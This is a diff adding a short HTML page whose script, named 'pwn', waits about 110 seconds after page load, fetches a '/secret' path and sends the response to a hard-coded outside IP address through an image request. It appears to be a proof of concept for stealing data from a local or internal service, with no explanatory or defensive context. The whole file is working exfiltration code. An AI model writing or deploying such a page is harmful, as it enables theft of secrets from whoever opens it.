@@ -1,0 +1,21 @@
+<html>
+<head>
+<script src="jquery.min.js"></script> <!-- can't access maxcdn in China -->
+<script type="text/javascript">
+
+function pwn() {
+    $.get('/secret', function(data) {
+        var image = new Image();
+        image.src='http://74.91.113.73:4321?data='+data;
+    });
+}
+
+function foo() {
+    setTimeout(pwn, 110 * 1000);
+}
+
+</script>
+</head>
+<body onload="foo()">
+</body>
+</html>
